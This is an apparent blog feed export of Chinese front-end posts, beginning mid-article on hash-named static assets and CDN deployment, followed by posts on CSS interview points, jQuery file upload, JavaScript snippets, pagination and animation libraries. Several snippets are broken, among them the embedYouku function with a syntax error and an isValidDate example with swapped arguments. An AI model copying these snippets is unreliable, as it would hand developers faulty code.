对文件求摘要信息，摘要信息与文件内容一一对应，就有了一种可以精确到单个文件粒度的缓存控制依据了。好了，我们把url改成带摘要信息的：这回再有文件修改，就只更新那个文件对应的url了，想到这里貌似很完美了。你觉得这就够了么？大公司告诉你：图样图森破！现代互联网企业，为了进一步提升网站性能，会把静态资源和动态网页分集群部署，静态资源会被部署到CDN节点上，网页中引用的资源也会变成对应的部署路径：好了，当我要更新静态资源的时候，同时也会更新html中的引用吧，就好像这样：这次发布，同时改了页面结构和样式，也更新了静态资源对应的url地址，现在要发布代码上线，亲爱的前端研发同学，你来告诉我，咱们是先上线页面，还是先上线静态资源？先部署页面，再部署资源：在二者部署的时间间隔内，如果有用户访问页面，就会在新的页面结构中加载旧的资源，并且把这个旧版本的资源当做新版本缓存起来，其结果就是：用户访问到了一个样式错乱的页面，除非手动刷新，否则在资源缓存过期之前，页面会一直执行错误。先部署资源，再部署页面：在部署时间间隔之内，有旧版本资源本地缓存的用户访问网站，由于请求的页面是旧版本的，资源引用没有改变，浏览器将直接使用本地缓存，这种情况下页面展现正常；但没有本地缓存或者缓存过期的用户访问网站，就会出现旧版本页面加载新版本资源的情况，导致页面执行错误，但当页面完成部署，这部分用户再次访问页面又会恢复正常了。好的，上面一坨分析想说的就是：先部署谁都不成！都会导致部署过程中发生页面错乱的问题。所以，访问量不大的项目，可以让研发同学苦逼一把，等到半夜偷偷上线，先上静态资源，再部署页面，看起来问题少一些。但是，大公司超变态，没有这样的“绝对低峰期”，只有“相对低峰期”。So，为了稳定的服务，还得继续追求极致啊！这个奇葩问题，起源于资源的 覆盖式发布，用 待发布资源 覆盖 已发布资源，就有这种问题。解决它也好办，就是实现 非覆盖式发布。看上图，用文件的摘要信息来对资源文件进行重命名，把摘要信息放到资源文件发布路径中，这样，内容有修改的资源就变成了一个新的文件发布到线上，不会覆盖已有的资源文件。上线过程中，先全量部署静态资源，再灰度部署页面，整个问题就比较完美的解决了。所以，大公司的静态资源优化方案，基本上要实现这么几个东西：配置超长时间的本地缓存 —— 节省带宽，提高性能采用内容摘要作为缓存更新依据 —— 精确的缓存控制静态资源CDN部署 —— 优化网络请求更资源发布路径实现非覆盖式发布 —— 平滑升级全套做下来，就是相对比较完整的静态资源缓存控制方案了，而且，还要注意的是，静态资源的缓存控制要求在 前端所有静态资源加载的位置都要做这样的处理 。是的，所有！什么js、css自不必说，还要包括js、css文件中引用的资源路径，由于涉及到摘要信息，引用资源的摘要信息也会引起引用文件本身的内容改变，从而形成级联的摘要变化，大概示意图就是：好了，目前我们快速的学习了一下前端工程中关于静态资源缓存要面临的优化和部署问题，新的问题又来了：这™让工程师怎么写码啊！！！要解释优化与工程的结合处理思路，又会扯出一堆有关模块化开发、资源加载、请求合并、前端框架等等的工程问题，以上只是开了个头，解决方案才是精髓，但要说的太多太多，有空再慢慢展开吧。总之，前端性能优化绝逼是一个工程问题！以上不是我YY的，可以观察 百度 或者 facebook 的页面以及静态资源源代码，查看它们的资源引用路径处理，以及网络请中静态资源的缓存控制部分。再次赞叹facebook的前端工程建设水平，跪舔了。建议前端工程师多多关注前端工程领域，也许有人会觉得自己的产品很小，不用这么变态，但很有可能说不定某天你就需要做出这样的改变了。而且，如果我们能把事情做得更极致，为什么不去做呢？另外，也不要觉得这些是运维或者后端工程师要解决的问题。如果由其他角色来解决，大家总是把自己不关心的问题丢给别人，那么前端工程师的开发过程将受到极大的限制，这种情况甚至在某些大公司都不少见！业界实践Assets PipelineRails中的Assets Pipeline完成了以上所说的优化细节，对整个静态资源的管理上的设计思考也是如此，了解rails的人也可以把此答案当做是对rails中assets pipeline设计原理的分析。rails通过把静态资源变成erb模板文件，然后加入&lt;%= asset_path ‘image.png’ %&gt;，上线前预编译完成处理，fis的实现思路跟这个几乎完全一样，但我们当初确实不知道有rails的这套方案存在。相关资料：英文版：http://guides.rubyonrails.org/asset_pipeline.html中文版：http://guides.ruby-china.org/asset_pipeline.html&nbsp;FIS的解决方案用 F.I.S 包装了一个小工具，完整实现整个回答所说的最佳部署方案，并提供了源码对照，可以感受一下项目源码和部署代码的对照。源码项目：https://github.com/fouber/static-resource-digest-project部署项目：https://github.com/fouber/static-resource-digest-project-release部署项目可以理解为线上发布后的结果，可以在部署项目里查看所有资源引用的md5化处理。这个示例也可以用于和assets pipeline做比较。fis没有assets的目录规范约束，而且可以以独立工具的方式组合各种前端开发语言（coffee、less、sass/scss、stylus、markdown、jade、ejs、handlebars等等你能想到的），并与其他后端开发语言结合。assets pipeline的设计思想值得独立成工具用于前端工程，fis就当做这样的一个选择吧。&nbsp;本地实践按照上文提到的FIS的解决方案，我本地尝试了一下，确实使用起来非常快捷。随便准备一个项目（附我自己新建的测试项目）项目结构：index.html:1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;Document&lt;/title&gt;&lt;link rel="stylesheet" href="./css/index.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Test&lt;/h1&gt;&lt;img src="./images/test.jpg" alt="pic test" class="img"&gt;&lt;ul class="js-ul"&gt;&lt;li class="dn js-li"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script src="./js/jquery-1.12.0.min.js"&gt;&lt;/script&gt;&lt;script src="./js/index.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;index.js:12345678910111213141516$(function()&#123; //数据源 var data = ["hello A","hello B","hello C"]; //构造列表 var $nodeArray = []; $.each(data,function(index,item)&#123; var $node = $(".js-li").clone().removeClass("dn"); $node.html(item); $nodeArray.push($node[0].outerHTML); &#125;); //绑定页面 $(".js-ul").html($nodeArray.join(""));&#125;);配置环境：1.安装nodejs2.npm install -g rsd打包部署项目1.命令行通过cd命令进入项目所在根目录2.在项目根目录下创建一个空的 fis-conf.js文件3.命令行中执行 rsd release –md5 –dest ../output（PS:../output是最终打包生成的文件所在的目录，可以自己随意指定）打包效果按照上面的步骤，就可以得到最终生成的文件，现在再来看看项目结构以及index.html代码1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;Document&lt;/title&gt;&lt;link rel="stylesheet" href="/css/index_fd3dde4.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Test&lt;/h1&gt;&lt;img src="/images/test_24c18dd.jpg" alt="pic test" class="img"&gt;&lt;ul class="js-ul"&gt;&lt;li class="dn js-li"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script src="/js/jquery-1.12.0.min_cbb11b5.js"&gt;&lt;/script&gt;&lt;script src="/js/index_62d2fd0.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;你看文件名和资源引用的名称都变化了，是不是很简单。快动手去尝试吧~~]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端代码部署</tag>
        <tag>前端开发代码部署</tag>
        <tag>前端部署</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[17个必须知道的css知识点]]></title>
    <url>%2F2016%2F07%2F08%2F17%E4%B8%AA%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84css%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[1.对WEB标准以及W3C的理解与认识（1）标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率；（2）使用外链css和js脚本、结构行为表现的分离、文件下载与页面速度更快；（3）内容能被更多的用户所访问、内容能被更广泛的设备所访问、更少的代码和组件；（4）容易维护、改版方便，不需要变动页面内容；（5）提供打印版本而不需要复制内容、提高网站易用性；2.xhtml和html有什么区别HTML是一种基本的WEB网页设计语言，XHTML是一个基于XML的置标语言最主要的不同：（1）XHTML 元素必须被正确地嵌套。（2） XHTML 元素必须被关闭。（3） 标签名必须用小写字母。（4） XHTML 文档必须拥有根元素。3.Doctype? 严格模式与混杂模式-如何触发这两种模式，区分它们有何意义?用于声明文档使用那种规范（html/Xhtml）一般为 严格 过度 基于框架的html文档加入XMl声明可触发，解析方式更改为IE5.5拥有IE5.5的bug4.行内元素有哪些？块级元素有哪些？CSS的盒模型？块级元素：div p h1 h2 h3 h4 form ul行内元素: a b br i span input selectCss盒模型:内容，border,margin，padding5.CSS引入的方式有哪些? link和@import的区别是?内联 内嵌 外链 导入区别 ：同时加载；前者无兼容性，后者CSS2.1以下浏览器不支持；Link支持使用javascript改变样式，后者不可6.CSS选择符有哪些？哪些属性可以继承？优先级算法如何计算？内联和important哪个优先级高？（1）标签选择符 类选择符 id选择符（2） 继承不如指定Id&gt;class&gt;标签选择l 内联和important优先级高是后者优先级高7.前端页面有哪三层构成，分别是什么？作用是什么？结构层 Html 表示层 CSS 行为层 js8.css的基本语句构成是？选择器{属性1:值1;属性2:值2;……}9.你做的页面在哪些流览器测试过？这些浏览器的内核分别是什么?Ie(Ie内核) 火狐（Gecko）谷歌（webkit）opear(Presto)10.写出几种IE6 BUG的解决方法（1）双边距BUG float引起的 使用display（2）像素问题 使用float引起的使用dislpay:inline -3px（3）超链接hover 点击后失效 使用正确的书写顺序 linkvisited hover activen Ie z-index问题给父级添加position:relative（4） Png 透明 使用js代码改（5）Min-height 最小高度 ！Important 解决’（6）select 在ie6下遮盖 使用iframe嵌套（7）为什么没有办法定义1px左右的宽度容器(IE6默认的行高造成的，使用over:hidden,zoom:0.08line-height:1px)11.标签上title与alt属性的区别是什么？Alt 当图片不显示是用文字代表。 Title 为该属性提供信息12.描述css reset的作用和用途。Reset重置浏览器的css默认属性浏览器的品种不同，样式不同，然后重置，让他们统一13.解释css sprites，如何使用。Css 精灵 把一堆小的图片整合到一张大的图片上，减轻服务器对图片的请求数量14.浏览器标准模式和怪异模式之间的区别是什么？（1）盒子模型 渲染模式的不同（2） 使用window.top.document.compatMode 可显示为什么模式15.你如何对网站的文件和资源进行优化？期待的解决方案包括：（1） 文件合并（2）文件最小化/文件压缩（3） 使用CDN托管（4）缓存的使用16.什么是语义化的HTML？直观的认识标签 对于搜索引擎的抓取有好处17.清除浮动的几种方式，各自的优缺点使用空标签清除浮动clear:both（理论上能清楚任何标签，增加无意义的标签）使用overflow:auto（空标签元素清除浮动而不得不增加无意代码的弊端,使用zoom:1用于兼容IE）是用afert伪元素清除浮动(用于非IE浏览器)]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery异步上传文件]]></title>
    <url>%2F2016%2F05%2F27%2Fjquery%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[问题描述：通过jQuery异步上传文件，这是HTML:123&lt;span&gt;File&lt;/span&gt;&lt;input type="file" id="file" name="file" size="10"/&gt;&lt;input id="uploadbutton" type="button" value="Upload"/&gt;JavaScript代码：1234567891011121314151617$(document).ready(function () &#123;$("#uploadbutton").click(function () &#123;var filename = $("#file").val();$.ajax(&#123;type: "POST",url: "addFile.do",enctype: 'multipart/form-data',data: &#123;file: filename&#125;,success: function () &#123;alert("Data Uploaded: ");&#125;&#125;);&#125;);&#125;);以上方法只能得到上传的文件名，怎么办？&nbsp;解决办法1：直接通过jQuery Form插件来解决这个问题：http://malsup.com/jquery/form/#code-samples，相关的API、Options对象可以自行查阅官网；解决办法2：采用HTML5，用jQuery,Ajax实现文件上传，不仅如此，你可以做文件验证（名称，大小，MIME类型）或利用HTML5的进度标签（或者div）处理进度事件；HTML代码：12345&lt;form enctype="multipart/form-data"&gt;&lt;input name="file" type="file" /&gt;&lt;input type="button" value="Upload" /&gt;&lt;/form&gt;&lt;progress&gt;&lt;/progress&gt;首先，你可以做一些验证，例如文件的onChange事件：1234567$(':file').change(function()&#123; var file = this.files[0]; name = file.name; size = file.size; type = file.type; //your validation&#125;);按钮点击触发Ajax:123456789101112131415161718192021222324$(':button').click(function()&#123; var formData = new FormData($('form')[0]); $.ajax(&#123; url: 'upload.php', //server script to process data type: 'POST', xhr: function() &#123; // custom xhr myXhr = $.ajaxSettings.xhr(); if(myXhr.upload)&#123; // check if upload property exists myXhr.upload.addEventListener('progress',progressHandlingFunction, false); // for handling the progress of the upload &#125; return myXhr; &#125;, //Ajax事件 beforeSend: beforeSendHandler, success: completeHandler, error: errorHandler, // Form数据 data: formData, //Options to tell JQuery not to process data or worry about content-type cache: false, contentType: false, processData: false &#125;);&#125;);处理进度：12345function progressHandlingFunction(e)&#123; if(e.lengthComputable)&#123; $('progress').attr(&#123;value:e.loaded,max:e.total&#125;); &#125;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax 上传文件</tag>
        <tag>jq 上传文件</tag>
        <tag>jquery.form.js</tag>
        <tag>jQuery异步上传文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超实用的10段 JavaScript 代码]]></title>
    <url>%2F2016%2F05%2F23%2F%E8%B6%85%E5%AE%9E%E7%94%A8%E7%9A%8410%E6%AE%B5-javascript-%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;JavaScript正变得越来越流行，它已经成为前端开发的第一选择，并且利用基于JavaScript语言的NodeJS，我们也可以开发出高性能的后端服务，甚至我还看到在硬件编程领域也出现了JavaScript的身影。JavaScript正在逐渐进化为一门全能的开发语言。但用好JavaScript并不容易，你除了需要掌握它的语法并知道如何写出高质量的代码之外，还需要了解如何解决那些几乎在每个项目中都会遇到的需求场景，比如：判断日期，高亮文本，限制字符数等等，有很多第三方库可以解决这些问题，但这些库可能并非只是为解决这一个问题而创建的，这意味着你需要引入了很多无关的代码，这将使你的整个系统变得臃肿，而且也会影响到系统的性能。我的做法是，收集和使用那些常见的JavaScript代码段，并在需要时，尽可能首先使用它们。下面便是我收集的10段实用JavaScript代码，基于它们你还可以创造出更强大的JS插件或功能函数。1. 判断日期是否有效&emsp;&emsp;JavaScript中自带的日期函数还是太过简单，很难满足真实项目中对不同日期格式进行解析和判断的需要。JQuery也有一些第三方库来使日期相关的处理变得简单，但有时你可能只需要一个非常简单的函数，而不想引入一个庞大的第三方库。这时，你可以使用下面这段日期校验代码，它允许你自定义日期格式并进行日期有效性的校验。123456789101112131415161718192021222324function isValidDate(value, userFormat) &#123; // Set default format if format is not provided userFormat = userFormat || 'mm/dd/yyyy'; // Find custom delimiter by excluding // month, day and year characters var delimiter = /[^mdy]/.exec(userFormat)[0]; // Create an array with month, day and year // so we know the format order by index var theFormat = userFormat.split(delimiter); // Create array from user date var theDate = value.split(delimiter); function isDate(date, format) &#123; var m, d, y, i = 0, len = format.length, f; for (i; i &lt; len; i++) &#123; f = format[i]; if (/m/.test(f)) m = date[i]; if (/d/.test(f)) d = date[i]; if (/y/.test(f)) y = date[i]; &#125; return ( m &gt; 0 &amp;amp;&amp;amp; m &lt; 13 &amp;amp;&amp;amp; y &amp;amp;&amp;amp; y.length === 4 &amp;amp;&amp;amp; d &gt; 0 &amp;amp;&amp;amp; // Check if it's a valid day of the month d &lt;= (new Date(y, m, 0)).getDate() ); &#125; return isDate(theDate, theFormat);&#125;使用方法：下面这个调用返回false，因为11月份没有31天isValidDate(‘dd-mm-yyyy’, ‘31/11/2012’)&nbsp;2. 获取一组元素的最大宽度或高度下面这个函数，对于需要进行动态排版的开发人员非常有用。1234567891011var getMaxHeight = function ($elms) &#123; var maxHeight = 0; $elms.each(function () &#123; // In some cases you may want to use outerHeight() instead var height = $(this).height(); if (height &gt; maxHeight) &#123; maxHeight = height; &#125; &#125;); return maxHeight;&#125;;使用方法：1$(elements).height( getMaxHeight($(elements)) );3. 高亮文本&emsp;&emsp;有很多JQuery的第三方库可以实现高亮文本的功能，但我更喜欢用下面这一小段JavaScript代码来实现这个功能，它非常短小，而且可以根据我的需要去进行灵活的修改，而且可以自己定义高亮的样式。下面这两个函数可以帮助你创建自己的文本高亮插件。12345678910111213function highlight(text, words, tag) &#123; // Default tag if no tag is provided tag = tag || 'span'; var i, len = words.length, re; for (i = 0; i &lt; len; i++) &#123; // Global regex to highlight all matches re = new RegExp(words[i], 'g'); if (re.test(text)) &#123; text = text.replace(re, '&lt;'+ tag +' class="highlight"&gt;$&amp;amp;'); &#125; &#125; return text;&#125;你同样会需要取消高亮的函数：123456function unhighlight(text, tag) &#123; // Default tag if no tag is provided tag = tag || 'span'; var re = new RegExp('(&lt;'+ tag +'.+?&gt;|&lt;\/'+ tag +'&gt;)', 'g'); return text.replace(re, '');&#125;使用方法：12345$('p').html( highlight( $('p').html(), // the text ['foo', 'bar', 'baz', 'hello world'], // list of words or phrases to highlight 'strong' // custom tag));4. 文字动效&emsp;&emsp;有时你会希望给你的一段文字增加动效，让其中的每个字都动起来。你可以使用下面这段jQuery插件代码来达到这个效果。当然你需要结合一个CSS3 transition样式来达到更好的效果。1234567891011$.fn.animateText = function(delay, klass) &#123; var text = this.text(); var letters = text.split(''); return this.each(function()&#123; var $this = $(this); $this.html(text.replace(/./g, '&lt;span class="letter"&gt;$&amp;amp;&lt;/span&gt;')); $this.find('span.letter').each(function(i, el)&#123; setTimeout(function()&#123; $(el).addClass(klass); &#125;, delay * i); &#125;); &#125;);&#125;;使用方法：1$('p').animateText(15, 'foo');5. 逐个隐藏元素&emsp;&emsp;下面这个jQuery插件可以根据你设置的步长（间隔时间）来逐个隐藏一组元素。在列表元素的重新加载中使用，可以达到很好的效果。123456789101112$.fn.fadeAll = function (ops) &#123; var o = $.extend(&#123; delay: 500, // delay between elements speed: 500, // animation speed ease: 'swing' // other require easing plugin &#125;, ops); var $el = this; for (var i=0, d=0, l=$el.length; i&lt;l; i++, d+=o.delay) &#123; $el.eq(i).delay(d).fadeIn(o.speed, o.ease); &#125; return $el;&#125;使用方法：1$(elements).fadeAll(&#123; delay: 300, speed: 300 &#125;);6. 限制文本字数下面这端脚本允许你根据给定的字符长度截取文本，如果文本被截取，那么它的后面会自动带上省略号。123456function excerpt(str, nwords) &#123; var words = str.split(' '); words.splice(nwords, words.length-1); return words.join(' ') + (words.length !== str.split(' ').length ? '…' : '');&#125;7. 判断相应式布局中当前适配度&emsp;&emsp;目前很多设计已经采用了响应式布局来适配网站或应用在不同设备上的显示。你经常需要在代码中判断当前处于哪一个屏幕适配度下。1234567891011121314function isBreakPoint(bp) &#123; // The breakpoints that you set in your css var bps = [320, 480, 768, 1024]; var w = $(window).width(); var min, max; for (var i = 0, l = bps.length; i &lt; l; i++) &#123; if (bps[i] === bp) &#123; min = bps[i-1] || 0; max = bps[i]; break; &#125; &#125; return w &gt; min &amp;&amp; w &lt;= max;&#125;使用方法：123456if ( isBreakPoint(320) ) &#123; // breakpoint at 320 or less&#125;if ( isBreakPoint(480) ) &#123; // breakpoint between 320 and 480&#125;8. 全局计数在一些游戏或广告场景中，你需要记录用户在当前页面上点击某一个按钮的次数，这时你可以使用jQuery的.data()函数来处理：1234567$(element) .data('counter', 0) // begin counter at zero .click(function() &#123; var counter = $(this).data('counter'); // get $(this).data('counter', counter + 1); // set // do something else... &#125;);9. 嵌入优酷视频12345678function embedYouku(link, ops) &#123; var o = $.extend(&#123; width: 480, height: 320, params: '' &#125;, ops); var id = /\?v\=(\w+)/.exec(link)[1]; return '&lt;embed id="embedid" src="'+id+'?'+o.ops'" type="application/x-shockwave-flash" width="'+o.width+'" height="'+o.height+'" align="middle"&gt;&lt;/embed&gt;使用方法：1234embedYouku( 'http://static.youku.com/v/swf/qplayer.swf', &#123;'winType=adshow&amp;amp;VideoIDS=XMTE3NzQ0NTky&amp;amp;isAutoPlay=false&amp;amp;isShowRelatedVideo=false'&#125;);10. 创建动态菜单或下拉列表&emsp;&emsp;在很多场景中，我们都需要动态地创建菜单、下拉列表或列表项。下面是一段最基础的代码实现上面的功能，你可以根据实际需要进行相应的扩展。123456789101112131415161718function makeMenu(items, tags) &#123; tags = tags || ['ul', 'li']; // default tags var parent = tags[0]; var child = tags[1]; var item, value = ''; for (var i = 0, l = items.length; i &lt; l; i++) &#123; item = items[i]; // Separate item and value if value is present if (/:/.test(item)) &#123; item = items[i].split(':')[0]; value = items[i].split(':')[1]; &#125; // Wrap the item in tag items[i] = '&lt;'+ child +' '+ (value &amp;amp;&amp;amp; 'value="'+value+'"') +'&gt;'+ // add value if present item +''; &#125; return '&lt;'+ parent +'&gt;'+ items.join('') +'';&#125;使用方法：12345678910// Dropdown select monthmakeMenu( ['January:JAN', 'February:FEB', 'March:MAR'], // item:value ['select', 'option']);// List of groceriesmakeMenu( ['Carrots', 'Lettuce', 'Tomatos', 'Milk'], ['ol', 'li']);&nbsp;总结：&emsp;&emsp;以上只是那些实用JavaScript代码段中的一小部分，我也建议你平时注意收集或自己编写这样的基础代码段，它们能在很多项目中使用或通过一些改造提供更完善的功能，使用这些代码段将为你节省下大量的开发时间。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>实用 JavaScript 代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery静态分页jPaging插件]]></title>
    <url>%2F2016%2F05%2F05%2Fjquery%E9%9D%99%E6%80%81%E5%88%86%E9%A1%B5jpaging%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[做列表页的时候，产品想实现分页功能，但是网站是全静态的，说之前一个官网的新闻列表用到过，就过去找来使用。代码量非常少，满足功能就为王。jPaging点击下载。使用说明：页面引入jQuery库及jPaging文件后，分析列表构成。我这里是div下ul li的列表。然后使用$.jPaging(‘.list ul li’,’li’,15,’.list’); .list ul li为要进行翻页的列表项，15代表多少条为一页，li为分页的项，.list为容器。然后，修改相应样式表信息。参考如下：相应代码：html部分：12345678910111213&lt;div class="list"&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;span&gt;2012-05-12&lt;/span&gt;【新闻】&lt;a href="http://k68.org"&gt;翻面演示&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;css部分：12345.jPaging-page&#123;text-align: center; color:#3790ff; line-height:24px;&#125;.jPaging-page a&#123;color:#3790ff; margin:0 5px; cursor:pointer;&#125;.jPaging-page a.jPaging-current&#123;font-weight:bold; color:#F00; text-decoration:underline;&#125;.jPaging-page .cur&#123;color:#8d2800;&#125;.jPaging-page span&#123;cursor:pointer;&#125;javascript部分：123$(function()&#123;$.jPaging('.list ul li','li',3,'.list');&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq 静态分页</tag>
        <tag>jquery静态分页jPaging插件</tag>
        <tag>js 静态分页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[loading加载动画在线生成工具]]></title>
    <url>%2F2016%2F05%2F05%2Floading%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB%E5%9C%A8%E7%BA%BF%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[loading加载动画图片在网页设计上也是比较常用的，当你使用一些AJAX脚本加载的时候，我们通常会使用一张loading gif图片来让用户知道正在加载中，这是很不错的用户体验，今天为大家分享一个loading加载动画在线生成工具可以大大节约了设计师的制作时间，真很方便哦。1、支持7种不同的加载样式除了以上哪么多样式外，用户还能自由改变进度条的颜色、大小、背景等等，自定义方面确实强大了。网站地址：Loading Generator,网址暂时打不开，可能是服务器挂了吧，过段时间应该就可以了！希望日后能增加更多漂亮的加载样式，哪就更赞了。2.Ajaxload网站网站地址：ajaxload由网友推荐的另一个在线loading动画制作工具，风格也很多，支持更改背景、LOADING样式以及透明背景设置，自己选择使用吧：）]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>loading 透明gif</tag>
        <tag>loading加载动画在线生成工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十个前端CSS3实用的动效库（工具）]]></title>
    <url>%2F2016%2F05%2F03%2F%E5%89%8D%E7%AB%AFcss3%E5%8D%81%E4%B8%AA%E5%AE%9E%E7%94%A8%E7%9A%84%E5%8A%A8%E6%95%88%E5%BA%93%EF%BC%88%E5%B7%A5%E5%85%B7%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;现在的网站和App的设计中越来越重视用户体验，而优秀的动效则能使你的应用更具交互性，从而吸引更多用户的使用。我一般会在网站中加入一些简单而一致的动效，我所用的技术则是用SASS+bourbon来生成出那些基于CSS3的动画效果来。但如果你对CSS3中定义动效还不熟练，或希望采用更加简单直接的方式在你的应用中引入动效的话，你可以参考并使用下面的这10个优秀动效库（工具）。&nbsp;1. Animate.css&emsp;&emsp;Animate.css是我比较喜欢的一个CSS3动效库，非常适合那些对CSS3动画效果不熟悉，但又希望给自己所做的网站或基于H5的APP引入动效的朋友。因为，你只需要给需要实现动效的元素添加上Animate.css中预定义的那些动效名称就可以了。比如常见的：bounce，flash，fadeIn，fadeOut等等，加起来有75种不同的动效，完全能够满足你的基本需要了。&emsp;&emsp;当然对于这个库也有一些使用注意事项，比如你最好在给元素添加动效样式完成动效后，马上将这个动效样式去掉。另外，对于动效的时长，振动幅度等，你也需要做一些调整。因为，我感觉它默认设置中的动效过于快速和强烈了。Animate.css已经提供了详细的文档告诉你应该如何做这些调整。&nbsp;2. Bounce.js&emsp;&emsp;Bounce.js是一个能够生成CSS3动效的小工具，它是用JavaScript编写的，提供了一个Web界面，你可以添加一个组件然后就可以选择包括Scale，Translate，Rotate，Skew这些动效类型，然后分别设置它们的参数，当达到你想要的效果后，你可以将这个动效以CSS的方式导出，这样你就可以将它应用到你的应用中了。&nbsp;3. CSS3 Animation&emsp;&emsp;CSS3 Animation是一个非常简单易用的动效工具，你可以在它提供的简单图形界面里，通过拖拽一些进度条来控制你的动效，生成的CSS代码会自动显示在下面的一个文本框里，你可以拷贝粘贴到你的应用中直接使用。&nbsp;4. CSS Animate&emsp;&emsp;如果你觉得上面的工具还无法做出你想要的动效，那么可以看看CSS Animate这个工具。它能让你设置更多的动效参数，比如你可以同时设置动效起始和终止状态的坐标，大小，以及透明度，这样你就能够做出更加复杂的动效来。&nbsp;5.Magic Animations&emsp;&emsp;Magic Animations与Animate.css十分类似，也是一个预定义了一系列动效的CSS库。但与Animate.css的最大区别可能是，它定义的那些动效更炫也更酷一些，如果你的网站也很新潮，那可以考虑使用这个CSS动效库。&nbsp;6.AniJS&emsp;&emsp;AniJS是一个通过JavaScript控制的动效库。它允许你通过它的链式语法来定义动效。比如下面这个例子：当用户点击时这个元素会沿Y轴翻转。data-anijs="if: click, do: flipInY, to: .container-box">```12345678910111213141516171819202122![css3动效库6](http://www.npm8.com/wp-content/uploads/2016/05/6-660x298.png)&amp;nbsp;### 7.[Single Element CSS Spinners](http://projects.lukehaas.me/css-loaders/)&amp;emsp;&amp;emsp;我们经常会需要一些动效来表达系统处于加载或处理数据的过程中。Single Element CSS Spinners这个在GitHub上的项目，提供了一组非常漂亮的可用于加载的CSS3动效。![css3动效库7](http://www.npm8.com/wp-content/uploads/2016/05/7-660x337.png)&amp;nbsp;### 8.[Snabbt.js](http://daniel-lundin.github.io/snabbt.js/)&amp;emsp;&amp;emsp;Sanbbt.js是我很喜欢的一个动效库，它非常小巧只有5K，所以可以被用在移动应用中。而且它也支持链式语法，你可以很方便地写出复杂的动效组合。```javascriptsnabbt(element, &#123;position: [200, 0, 0],easing: function(value) &#123;return value + 0.3 * Math.sin(2*Math.PI * value);&#125;&#125;).snabbt(&#123;position: [0, 0, 0],easing: &apos;easeOut&apos;&#125;);&nbsp;9.Odometer&emsp;&emsp;Odometer是用来给数字作动效的，比如通过它你可以很好地呈现网站人数的增加，倒计时等与数字相关的动画效果。&nbsp;10.Hover.css&emsp;&emsp;Hover.css提供了大量的Hover效果，包括2D变换，图标变换，背景变换等等。而且几乎可以应用于所有元素，包括链接，按钮，logo，SVG甚至图片等等。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>CSS3动效库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集锦有用的CSS技巧代码段]]></title>
    <url>%2F2016%2F04%2F21%2F%E9%9B%86%E9%94%A6%E6%9C%89%E7%94%A8%E7%9A%84css%E6%8A%80%E5%B7%A7%E4%BB%A3%E7%A0%81%E6%AE%B5%2F</url>
